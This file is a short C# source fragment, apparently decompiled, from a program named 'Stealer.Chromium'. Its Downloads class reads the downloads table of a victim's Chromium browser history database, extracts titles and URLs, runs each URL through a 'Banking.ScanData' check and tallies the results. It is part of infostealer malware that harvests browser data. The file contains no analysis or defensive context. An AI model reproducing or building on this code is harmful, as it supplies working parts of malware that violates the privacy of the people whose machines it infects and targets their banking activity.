using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000033 RID: 51
	internal sealed class Downloads
	{
		// Token: 0x060000E1 RID: 225 RVA: 0x00007FA4 File Offset: 0x000061A4
		public static List<Site> Get(string sHistory)
		{
			List<Site> result;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "downloads");
				if (sqlite == null)
				{
					result = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site item = default(Site);
						item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 17));
						Banking.ScanData(item.sUrl);
						Counter.Downloads++;
						list.Add(item);
					}
					result = list;
				}
			}
			catch
			{
				result = new List<Site>();
			}
			return result;
		}
	}
}
